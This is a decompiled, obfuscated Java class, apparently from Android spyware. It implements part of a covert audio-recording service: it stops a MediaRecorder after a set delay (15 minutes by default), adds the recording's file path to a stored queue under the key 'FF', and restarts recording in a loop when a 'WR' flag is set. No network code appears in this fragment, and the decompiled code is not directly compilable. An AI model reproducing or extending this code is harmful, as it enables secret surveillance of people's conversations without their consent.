package com.example.mmm.service;

import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import com.example.mmm.Service.srvRecordAudio;
import com.example.mmm.Utils.utils;

final class srvRecordAudio$Runnable implements Runnable {
   final int sorted$;
   final MediaRecorder animated$;
   final String valve$;
   final Context attitude$;
   final srvRecordAudio xanax$;

   srvRecordAudio$Runnable(srvRecordAudio var1, int var2, MediaRecorder var3, String var4, Context var5) {
      this.xanax$ = var1;
      this.sorted$ = var2;
      this.animated$ = var3;
      this.valve$ = var4;
      this.attitude$ = var5;
   }

   public final void run() {
      if (this.sorted$ == -1) {
         Thread.sleep(900000L);
      } else {
         Thread.sleep((long)(this.sorted$ * 1000));
      }

      this.xanax$.brunei$.Log("SOUND", "STOP RECORD SOUND");
      this.animated$.stop();
      this.animated$.release();
      utils var1 = this.xanax$.brunei$;
      String var2 = "FILE";
      StringBuilder var3 = new StringBuilder();
      var3.append(this.valve$);
      var1.Log(var2, var3.toString());
      String var4 = this.xanax$.brunei$.SettingsRead(this.attitude$, "FF");
      StringBuilder var5 = new StringBuilder();
      var5.append(var4);
      var5.append("###");
      var5.append(this.valve$);
      var4 = var5.toString();
      this.xanax$.brunei$.SettingsWrite(this.attitude$, "FF", var4);
      if (this.sorted$ == -1) {
         if (this.xanax$.brunei$.SettingsRead(this.attitude$, "WR").equals("1")) {
            this.xanax$.startService((new Intent(this.attitude$, srvRecordAudio.class)).putExtra("tick", "-1").putExtra("name", "record_audio"));
         } else {
            this.xanax$.brunei$.SettingsWrite(this.attitude$, "SS", "");
         }
      } else {
         this.xanax$.brunei$.SettingsWrite(this.attitude$, "SS", "");
      }
   }
}
